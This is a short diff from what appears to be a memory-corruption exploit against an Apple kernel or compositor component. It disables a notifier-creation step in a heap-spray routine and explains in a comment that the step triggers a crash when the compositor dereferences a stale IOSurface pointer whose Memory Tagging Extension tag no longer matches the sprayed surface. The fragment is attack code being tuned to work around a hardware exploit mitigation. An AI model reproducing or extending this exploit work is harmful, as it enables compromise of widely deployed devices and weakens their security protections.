@@ -19741,7 +19741,16 @@ new_modes:
                 int r229_notifier_count = 0;
                 memset(r229_notifiers, 0, sizeof(r229_notifiers));
 
-                if (notifier_create_fn) {
+                /* SKIP notifier creation entirely — creating notifiers populates
+                 * the kernel callback array, which causes the compositor to dereference
+                 * the stale notification entry's IOSurface* pointer via inner_method.
+                 * With MTE, the old tag on that pointer mismatches the new spray surface's
+                 * tag, causing an immediate crash during usleep. Wake port detection
+                 * was confirmed dead (inner returns 0 for callback_count=0 surfaces).
+                 * Go directly to crash_count check and skip bsearch.
+                 */
+                rlog("  r=229: Skipping notifier creation (causes MTE crash via compositor traversal)\n");
+                if (0 && notifier_create_fn) {
                     dispatch_queue_t nq = dispatch_queue_create("com.research.notifier", DISPATCH_QUEUE_SERIAL);
                     for (int si = 0; si < 256; si++) {
                         if (r229_spray[si]) {
